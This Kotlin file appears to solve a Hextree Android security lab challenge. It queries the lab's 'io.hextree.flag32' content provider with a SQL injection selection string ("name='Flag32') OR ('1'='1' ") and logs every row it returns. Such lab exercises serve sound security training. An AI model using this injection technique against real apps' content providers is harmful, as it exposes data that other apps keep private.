package com.pachinko.intentattacksurface.utils

import android.content.Context
import android.database.Cursor
import android.database.DatabaseUtils
import android.util.Log
import androidx.core.net.toUri

object Flag32 {
    fun getFlag(context: Context) {
        val uri = "content://io.hextree.flag32/flags".toUri()
        try {
            val cursor: Cursor? = context.contentResolver.query(
                uri,
                null, "name='Flag32') OR ('1'='1' ", null, null
            )
            cursor?.use {
                val cursorDump = DatabaseUtils.dumpCursorToString(it)
                Log.d("Flag32", "Cursor Data:\n$cursorDump")
            } ?: run {
                Log.e("Flag32", "Cursor returned null. Check authority or visibility.")
            }
            cursor?.close()
        } catch (e: Error) {
            Log.e("Flag32ERR", e.message.toString())
        }
    }
}
